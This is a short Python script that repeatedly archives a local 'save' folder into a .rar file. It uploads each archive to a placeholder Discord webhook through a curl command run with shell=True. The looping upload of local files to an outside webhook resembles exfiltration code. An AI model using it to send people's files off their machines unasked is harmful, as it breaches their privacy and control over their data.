import patoolib
import time
import os
import subprocess
#By aamonlavidaa
SAVE_FOLDER = "save"
asd = "save"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_LINK"

def create_rar(folder, output_filename):
    try:
        patoolib.create_archive(output_filename, (folder,))
        print(f"{output_filename} Created.")
    except Exception as e:
        print(f"Error creating {output_filename}: {str(e)}")

def send_webhook(name):
    execute = f'curl -X POST -H "Content-Type: multipart/form-data" -F "file=@{os.path.join(os.getcwd(), name)}" "{DISCORD_WEBHOOK_URL}"'
    try:
        subprocess.call(execute, shell=True)
        print("WebHook Sent.")
    except Exception as e:
        print(f"Error sending WebHook: {str(e)}")

while True:
    subprocess.call("color 2", shell=True)
    time.sleep(5)

    create_rar(SAVE_FOLDER, f"{asd}.rar")
    
    send_webhook(f"{asd}.rar")
    
    time.sleep(3)
    subprocess.call("cls", shell=True)
